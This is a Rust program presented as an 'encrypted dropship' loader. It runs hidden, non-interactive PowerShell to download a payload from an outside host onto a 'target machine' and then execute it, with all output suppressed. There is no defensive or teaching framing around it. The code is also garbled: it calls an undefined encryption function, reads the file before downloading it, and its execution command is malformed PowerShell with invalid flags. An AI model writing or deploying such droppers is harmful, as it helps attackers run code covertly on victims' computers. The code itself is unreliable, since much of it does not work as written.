use std::io::{Read, Write};
use std::fs::File;
use std::process::{Command, Stdio};

// Function to generate AES256 encrypted dropship
fn generate_encrypted_dropship() -> Vec<u8> {
// Generate AES256 key and IV (not shown in this example)
let key = "ff827540075736f397c113a5edcb5d93".as_bytes();
let iv = "8cJf6yKp5rEaBtDz".as_bytes();

// Encrypt dropship using AES256
let encrypted_dropship = encrypt_using_aes(b"dropship", key, iv);

return encrypted_dropship;

}

// Function to download and execute the encrypted dropship on target machine
fn run_encrypted_dropship() {
let mut encrypted_dropship = generate_encrypted_dropship();

// Replace the following URL with your own web-hosted AES256 encrypted dropship file
let url = "https://attck.pages.dev/attcks/payloads/dropship.bin";

let mut file = File::open("dropship.bin").expect("Unable to open file");
file.read_to_end(&mut encrypted_dropship).expect("Error reading from file");

// Download the encrypted dropship file
let output = Command::new("powershell")
    .arg("-NoP")
    .arg("-NonI")
    .arg("-W Hidden")
    .arg(&format!("Invoke-WebRequest -Uri {} -OutFile dropship.bin", url))
    .stdout(Stdio::null())
    .stderr(Stdio::null())
    .output()
    .expect("Error executing PowerShell command");

// Check if the download was successful
if output.status.success() {
    // Execute the encrypted dropship file
    let output = Command::new("powershell")
        .arg("-NoP")
        .arg("-NonI")
        .arg("-W Hidden")
        .arg(&format!("$bytes=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String(Get-Content dropship.bin | ForEach-Object { if ($_ -eq $null) {} else { [System.Web.HttpUtility]::UrlEncode($_) }})); [byte[]]($bytes); i = 0; while (i -lt $bytes.Length) {{ $i++ }}"))
        .arg("-ExecuteByPass")
        .arg("-NoExit")
        .arg(&format!("dropship.bin"))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .expect("Error executing PowerShell command");
} else {
    println!("Download failed!");
}

}

fn main() {
run_encrypted_dropship();
}